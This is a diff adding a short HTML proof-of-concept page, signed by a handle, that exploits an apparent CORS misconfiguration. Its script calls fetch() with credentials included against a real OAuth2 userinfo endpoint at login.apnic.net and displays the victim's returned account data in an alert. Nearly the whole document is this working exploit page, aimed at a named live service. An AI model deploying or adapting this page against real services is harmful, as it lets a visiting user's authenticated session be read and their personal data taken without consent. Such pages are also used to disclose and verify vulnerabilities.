@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploited by Cyb3r_C0re17</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0f0f0f;
+      color: #00ffcc;
+      text-align: center;
+      padding-top: 50px;
+    }
+    button {
+      background-color: #00ffcc;
+      border: none;
+      color: #0f0f0f;
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 8px;
+    }
+    button:hover {
+      background-color: #00c0aa;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>CORS exploited by Cyb3r_C0re17</h1>
+  <button onclick="exploitCORS()">Exploit</button>
+
+  <script>
+    function exploitCORS() {
+      fetch('https://login.apnic.net/oauth2/apnic/v1/userinfo', {
+        credentials: 'include'
+      })
+      .then(response => response.text())
+      .then(data => {
+        alert("CORS Response:\n\n" + data);
+      })
+      .catch(error => {
+        alert("Failed to fetch CORS response.\n\nError: " + error);
+      });
+    }
+  </script>
+
+</body>
+</html>
